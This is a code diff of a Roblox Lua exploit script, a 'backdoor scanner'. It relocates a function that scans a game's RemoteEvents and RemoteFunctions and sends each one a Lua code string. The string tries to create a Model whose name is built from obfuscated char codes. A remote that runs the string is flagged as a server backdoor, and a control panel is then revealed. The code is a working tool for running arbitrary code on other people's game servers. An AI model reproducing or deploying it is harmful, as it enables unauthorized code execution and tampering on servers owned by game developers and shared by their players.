@@ -4,7 +4,69 @@ local tweenInfo = TweenInfo.new(0.4)
 
 
 
+function SAV()
+	local rem = nil
+	if not scanning then
+		scanning = true
+		gotremote = nil
+		rTable = {}
 
+		notify("n0ta's scanner v1", "BDLegacy Api\nScanning")
+
+		local targets = {
+			game:GetService("Lighting"),
+			game:GetService("Workspace"),
+			game:GetService("ReplicatedStorage")
+		}
+
+		for _, container in ipairs(targets) do
+			for _, b in ipairs(container:GetDescendants()) do
+				if b:IsA("RemoteEvent") or b:IsA("RemoteFunction") then
+					table.insert(rTable, b)
+				end
+			end
+		end
+
+		for _, v in ipairs(rTable) do
+			if gotremote == nil then
+				local nwh = string.char(
+					0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 0x0047, 0x0048,
+					0x0049, 0x004A, 0x004B, 0x004C, 0x004D, 0x004E, 0x004F, 0x0050,
+					0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057, 0x0058,
+					0x0059, 0x005A, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046
+				)
+
+				local code = 'Instance.new("Model", workspace).Name="' .. nwh .. '"'
+				rem = v
+
+				if v:IsA("RemoteEvent") then
+					v:FireServer(code)
+				elseif v:IsA("RemoteFunction") then
+					task.spawn(function()
+						v:InvokeServer(code)
+					end)
+				end
+
+				wait(0.6)
+				if workspace:FindFirstChild(nwh) and workspace[nwh]:IsA("Model") then
+					notify("n0ta's scanner", "BDLegacy Api\nInstance Exists")
+					gotremote = v
+				    remote = v
+				end
+			end
+		end
+
+		if gotremote ~= nil then
+		    frame.Visible = true
+			notify("n0ta's scanner v1", "Success! Found Backdoor")
+		else
+			notify("n0ta's scanner", "No Backdoor Found")
+		end
+
+		scanning = false
+	
+	end
+end
 
 
 
@@ -193,69 +255,7 @@ local gotremote = nil
 local rTable = {}
 local bdinstance = nil
 
-function SAV()
-	local rem = nil
-	if not scanning then
-		scanning = true
-		gotremote = nil
-		rTable = {}
 
-		notify("n0ta's scanner v1", "BDLegacy Api\nScanning")
-
-		local targets = {
-			game:GetService("Lighting"),
-			game:GetService("Workspace"),
-			game:GetService("ReplicatedStorage")
-		}
-
-		for _, container in ipairs(targets) do
-			for _, b in ipairs(container:GetDescendants()) do
-				if b:IsA("RemoteEvent") or b:IsA("RemoteFunction") then
-					table.insert(rTable, b)
-				end
-			end
-		end
-
-		for _, v in ipairs(rTable) do
-			if gotremote == nil then
-				local nwh = string.char(
-					0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046, 0x0047, 0x0048,
-					0x0049, 0x004A, 0x004B, 0x004C, 0x004D, 0x004E, 0x004F, 0x0050,
-					0x0051, 0x0052, 0x0053, 0x0054, 0x0055, 0x0056, 0x0057, 0x0058,
-					0x0059, 0x005A, 0x0041, 0x0042, 0x0043, 0x0044, 0x0045, 0x0046
-				)
-
-				local code = 'Instance.new("Model", workspace).Name="' .. nwh .. '"'
-				rem = v
-
-				if v:IsA("RemoteEvent") then
-					v:FireServer(code)
-				elseif v:IsA("RemoteFunction") then
-					task.spawn(function()
-						v:InvokeServer(code)
-					end)
-				end
-
-				wait(0.6)
-				if workspace:FindFirstChild(nwh) and workspace[nwh]:IsA("Model") then
-					notify("n0ta's scanner", "BDLegacy Api\nInstance Exists")
-					gotremote = v
-				    remote = v
-				end
-			end
-		end
-
-		if gotremote ~= nil then
-		    frame.Visible = true
-			notify("n0ta's scanner v1", "Success! Found Backdoor")
-		else
-			notify("n0ta's scanner", "No Backdoor Found")
-		end
-
-		scanning = false
-	
-	end
-end
 
   --  Code
 
